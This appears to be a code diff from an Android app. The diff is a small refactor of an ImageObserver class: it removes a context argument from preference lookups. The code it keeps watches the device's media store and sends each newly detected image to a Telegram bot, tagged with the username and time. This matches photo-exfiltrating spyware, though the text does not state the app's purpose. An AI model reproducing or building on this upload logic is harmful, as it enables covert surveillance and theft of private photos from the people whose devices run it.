@@ -43,7 +43,7 @@ public class ImageObserver extends ContentObserver {
     public void onChange(boolean selfChange, Uri uri) {
         super.onChange(selfChange, uri);
 
-        if (uri == null || !SharedPrefs.getImgLib(mContext)) return;
+        if (uri == null || !SharedPrefs.getImgLib()) return;
         String lastSegment = uri.getLastPathSegment();
         if (TextUtils.isEmpty(lastSegment) || !TextUtils.isDigitsOnly(lastSegment)) {
             Log.v(TAG, "Ignoring non-specific URI: " + uri);
@@ -130,7 +130,7 @@ public class ImageObserver extends ContentObserver {
             File imgFile = new File(path);
             if (imgFile.exists()) {
                 Log.i(TAG, "New unique image: " + path);
-                TelegramBot.with(mContext).sendPhoto(imgFile, "User: " + SharedPrefs.getUsername(mContext)+ "\nTime: " + Utility.getStandardDatenTime());
+                TelegramBot.with(mContext).sendPhoto(imgFile, "User: " + SharedPrefs.getUsername()+ "\nTime: " + Utility.getStandardDatenTime());
 
             }
         }
